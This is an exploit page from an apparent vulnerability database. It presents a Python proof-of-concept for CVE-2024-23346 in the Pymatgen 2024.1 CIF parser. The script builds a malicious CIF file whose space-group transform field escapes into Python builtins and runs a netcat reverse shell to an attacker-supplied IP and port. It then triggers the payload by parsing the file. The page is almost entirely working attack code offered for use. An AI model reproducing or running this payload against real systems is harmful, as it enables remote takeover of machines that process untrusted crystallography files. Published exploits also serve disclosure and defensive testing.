---
title: Pymatgen 2024.1 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025040044
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-29
fetch_date: 2025-10-06T22:02:45.104229
---

# Pymatgen 2024.1 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Pymatgen 2024.1 Remote Code Execution**  **2025.04.28**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-23346](https://cxsecurity.com/cveshow/CVE-2024-23346/ "Click to see CVE-2024-23346")**  CWE: **N/A** | |

# Exploit Title : Pymatgen 2024.1 - Remote Code Execution (RCE)
# Google Dork : (not applicable)
# Date : 2024-11-13
# Exploit Author : Mohammed Idrees Banyamer
# Vendor Homepage : https ://pymatgen.org
# Software Link : https ://pypi.org /project /pymatgen/
# Version : 2024.1
# Tested on : Kali Linux 2024.1
# CVE : CVE-2024-23346
import os
# Function to create the malicious CIF file
def create\_malicious\_cif(ip, port):
# Constructing the malicious CIF file with reverse shell payload
malicious\_cif = f"""
data\_5yOhtAoR
\_audit\_creation\_date 2024-11-13
\_audit\_creation\_method "CVE-2024-23346 Pymatgen CIF Parser Reverse Shell Exploit"
loop\_
\_parent\_propagation\_vector.id
\_parent\_propagation\_vector.kxkykz
k1 [0 0 0]
\_space\_group\_magn.transform\_BNS\_Pp\_abc 'a,b,[d for d in ().\_\_class\_\_.\_\_mro\_\_[1].\_\_getattribute\_\_ ( \*[().\_\_class\_\_.\_\_mro\_\_[1]]+["\_\_sub" + "classes\_\_"]) () if d.\_\_name\_\_ == "BuiltinImporter"][0].load\_module ("os").system ("nc {ip} {port} -e /bin/bash");0,0,0'
\_space\_group\_magn.number\_BNS 62.448
\_space\_group\_magn.name\_BNS "P n' m a' "
"""
# Save to a file
with open("vuln.cif", "w") as file:
file.write(malicious\_cif)
print("[\*] Malicious CIF file created: vuln.cif")
# Function to trigger the exploit by parsing the malicious CIF file
def exploit():
ip = input("Enter your IP address for the reverse shell: ")
port = input("Enter the port for the reverse shell to listen on: ")
# Create the malicious CIF file
create\_malicious\_cif(ip, port)
# Trigger the Pymatgen CIF parser to parse the malicious file
from pymatgen.io.cif import CifParser
parser = CifParser("vuln.cif")
structure = parser.parse\_structures()
# Running the exploit
if \_\_name\_\_ == "\_\_main\_\_":
exploit()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040044)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top